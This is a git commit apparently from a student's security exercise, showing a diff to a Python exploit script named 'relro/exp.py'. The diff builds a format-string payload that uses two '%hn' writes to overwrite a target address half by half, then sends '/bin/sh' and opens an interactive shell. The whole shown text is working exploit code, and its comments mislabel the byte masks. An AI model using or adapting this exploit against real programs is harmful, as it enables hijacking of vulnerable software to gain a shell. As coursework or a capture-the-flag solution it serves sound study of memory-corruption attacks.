cd56117a6f6cc04e5f695b46ae26a735861095da
ahermani <agnieszka.hermaniuk.stud@pw.edu.pl>
2021-04-30 17:38:45 +0200

    first stage

--- relro/exp.py
+++ relro/exp.py
@@ -12,17 +12,27 @@ stack_num = 4
 buf = p32(address)
 buf += p32(address+2)
 
+#take 4 last bytes
+lsb = val & 0xffff
+#take 4 first bytes
+msb = val >> 16
+
 #number of bytes to write before hn
-count = 0x0c830 - len(buf)
+count = lsb - len(buf)
 
 #change 2 LS bytes
 buf += "%" + str(count) + "x%" + str(stack_num) + "$hn"
 
-count = 0xf7e0-0x0c830
+#check if msb  must be extended
+if msb>lsb:
+    count = msb-lsb
+else:
+    count = (msb | 0x10000) - lsb
 
 #change 2 MS bytes
 buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"
 
+#gdb.attach(p)
 p.sendline(buf)
 p.sendline("/bin/sh")
 p.interactive()
